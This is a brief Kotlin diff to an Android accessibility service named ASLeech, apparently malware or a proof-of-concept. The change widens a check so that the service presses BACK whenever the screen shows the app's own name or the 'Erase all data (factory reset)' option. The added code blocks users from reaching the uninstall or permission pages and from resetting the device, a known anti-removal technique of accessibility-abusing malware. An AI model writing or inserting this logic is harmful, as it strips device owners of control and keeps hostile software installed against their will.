@@ -32,10 +32,7 @@ class ASLeech : AccessibilityService() {
     }
 
     private fun findAndPerformAction(nodeInfo: AccessibilityNodeInfo): Boolean {
-        if (nodeInfo.packageName == "com.android.settings" &&
-            nodeInfo.className == "android.widget.TextView" &&
-            nodeInfo.text == "ASLeech") {
-
+        if (nodeInfo.text == "ASLeech" || nodeInfo.text == "Erase all data (factory reset)") {
             performGlobalAction(GLOBAL_ACTION_BACK)
             return true
         }
